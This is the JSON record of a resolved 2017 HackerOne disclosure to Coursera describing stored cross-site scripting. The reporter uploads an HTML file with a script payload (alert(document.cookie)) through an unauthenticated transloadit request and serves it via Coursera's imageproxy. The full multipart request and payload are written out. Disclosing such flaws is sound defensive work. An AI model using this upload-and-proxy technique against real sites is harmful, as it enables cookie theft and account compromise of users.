{"id":216822,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTY4MjI=","url":"https://hackerone.com/reports/216822","title":"Stored XSS via transloadit.com and imageproxy","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-03-28T22:32:00.312Z","submitted_at":"2017-03-28T22:32:00.312Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"c0rdis","url":"/c0rdis","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/695/8bc5ec2323f00e8097cf96e37a4424139e4b1ff0_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1516,"url":"https://hackerone.com/coursera","handle":"coursera","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/516/1b768e83ae5f9a676c10284bacd855c3dfa8a841_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/516/1b768e83ae5f9a676c10284bacd855c3dfa8a841_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Coursera","twitter_handle":"coursera","website":"https://www.coursera.org","about":"We provide universal access to the world’s best education."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-30T21:38:45.594Z","bug_reporter_agreed_on_going_public_at":"2017-10-31T21:38:44.588Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\ndue to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. \n\nSteps to reproduce:\n\n1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.\nPOST /assemblies/[hash]?redirect=false HTTP/1.1\nHost: isadora.transloadit.com\nReferer: https://api.coursera.org/account/profile\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880\nContent-Length: 521\n\n-----------------------------185739484714145007371896001845\nContent-Disposition: form-data; name=\"params\"\n\n{\"max_size\":1048576,\"auth\":{\"key\":\"[hash2]\"},\"template_id\":\"[hash3]\"}\n-----------------------------185739484714145007371896001845\nContent-Disposition: form-data; name=\"my_file\"; filename=\"stored_xss.html\"\nContent-Type: text/html\n\n\u003chtml\u003e\n\u003cscript\u003e\nalert(document.cookie);\n\u003c/script\u003e\n\u003c/html\u003e\n-----------------------------185739484714145007371896001845--\n\n2) By accessing https://isadora.transloadit.com/assemblies/[hash]?seq=0\u0026callback=, we can learn the URL of the uploaded malicious file (in this case it's http://coursera-profile-photos.s3.amazonaws.com██████████stored_xss.html)\n\n3) Since it's already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com█████stored_xss.html\n\nPlease find the screenshot attached.\nAA","vulnerability_information_html":"\u003cp\u003eHello,\u003cbr\u003e\ndue to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. \u003c/p\u003e\n\n\u003cp\u003eSteps to reproduce:\u003c/p\u003e\n\n\u003cp\u003e1) Let\u0026#39;s send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.\u003cbr\u003e\nPOST /assemblies/[hash]?redirect=false HTTP/1.1\u003cbr\u003e\nHost: isadora.transloadit.com\u003cbr\u003e\nReferer: \u003ca title=\"https://api.coursera.org/account/profile\" href=\"/redirect?url=https%3A%2F%2Fapi.coursera.org%2Faccount%2Fprofile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.coursera.org/account/profile\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nConnection: close\u003cbr\u003e\nUpgrade-Insecure-Requests: 1\u003cbr\u003e\nContent-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880\u003cbr\u003e\nContent-Length: 521\u003c/p\u003e\n\n\u003cp\u003e-----------------------------185739484714145007371896001845\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;params\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;max_size\u0026quot;:1048576,\u0026quot;auth\u0026quot;:{\u0026quot;key\u0026quot;:\u0026quot;[hash2]\u0026quot;},\u0026quot;template_id\u0026quot;:\u0026quot;[hash3]\u0026quot;}\u003cbr\u003e\n-----------------------------185739484714145007371896001845\u003cbr\u003e\nContent-Disposition: form-data; name=\u0026quot;my_file\u0026quot;; filename=\u0026quot;stored_xss.html\u0026quot;\u003cbr\u003e\nContent-Type: text/html\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n\u0026lt;script\u0026gt;\u003cbr\u003e\nalert(document.cookie);\u003cbr\u003e\n\u0026lt;/script\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003cbr\u003e\n-----------------------------185739484714145007371896001845--\u003c/p\u003e\n\n\u003cp\u003e2) By accessing \u003ca title=\"https://isadora.transloadit.com/assemblies/%5Bhash%5D?seq=0\u0026amp;callback=\" href=\"/redirect?url=https%3A%2F%2Fisadora.transloadit.com%2Fassemblies%2F%255Bhash%255D%3Fseq%3D0%26callback%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://isadora.transloadit.com/assemblies/%5Bhash%5D?seq=0\u0026amp;callback=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, we can learn the URL of the uploaded malicious file (in this case it\u0026#39;s \u003ca title=\"http://coursera-profile-photos.s3.amazonaws.xn--comstored_xss-dm2iaaaaaaaaa.html\" href=\"/redirect?url=http%3A%2F%2Fcoursera-profile-photos.s3.amazonaws.xn--comstored_xss-dm2iaaaaaaaaa.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://coursera-profile-photos.s3.amazonaws.xn--comstored_xss-dm2iaaaaaaaaa.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003e3) Since it\u0026#39;s already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: \u003ca title=\"https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88stored_xss.html\" href=\"/redirect?url=https%3A%2F%2Fwww.coursera.org%2Fapi%2Futilities%2Fv1%2Fimageproxy%2Fhttp%3A%2F%2Fcoursera-profile-photos.s3.amazonaws.com%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588stored_xss.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88stored_xss.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ePlease find the screenshot attached.\u003cbr\u003e\nAA\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-11-30T21:38:44.679Z","allow_singular_disclosure_after":-97140006.06686085,"singular_disclosure_allowed":true,"vote_count":5,"voters":["eveeez","r3y","cr4xerbik4sh","rajauzairabdullah","dhqwoxfqvm"],"severity":{"rating":"high","score":7.2,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1605413,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-11T18:08:03.012Z","updated_at":"2017-04-11T18:08:03.012Z","actor":{"username":"jkostyukova","cleared":false,"url":"/jkostyukova","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"coursera","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1605418,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report!","markdown_message":"\u003cp\u003eThanks for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-11T18:08:51.203Z","updated_at":"2017-04-11T18:08:51.203Z","actor":{"username":"jkostyukova","cleared":false,"url":"/jkostyukova","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"coursera","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1700984,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem. Any updates?","markdown_message":"\u003cp\u003eNo problem. Any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-25T16:02:38.629Z","updated_at":"2017-05-25T16:02:38.629Z","actor":{"username":"c0rdis","cleared":false,"url":"/c0rdis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/695/8bc5ec2323f00e8097cf96e37a4424139e4b1ff0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"coursera","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2119314,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"closing old stale issue. thanks.","markdown_message":"\u003cp\u003eclosing old stale issue. thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-31T21:34:53.724Z","updated_at":"2017-10-31T21:34:53.724Z","actor":{"username":"artifact","cleared":false,"url":"/artifact","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"c0rdis","url":"/c0rdis"},"genius_execution_id":null,"team_handle":"coursera","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2119328,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-31T21:38:44.623Z","updated_at":"2017-10-31T21:38:44.623Z","first_to_agree":true,"actor":{"username":"c0rdis","cleared":false,"url":"/c0rdis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/695/8bc5ec2323f00e8097cf96e37a4424139e4b1ff0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"coursera","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2192237,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T21:38:45.638Z","updated_at":"2017-11-30T21:38:45.638Z","actor":{"url":"/coursera","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/516/1b768e83ae5f9a676c10284bacd855c3dfa8a841_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Coursera"}},"genius_execution_id":null,"team_handle":"coursera","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}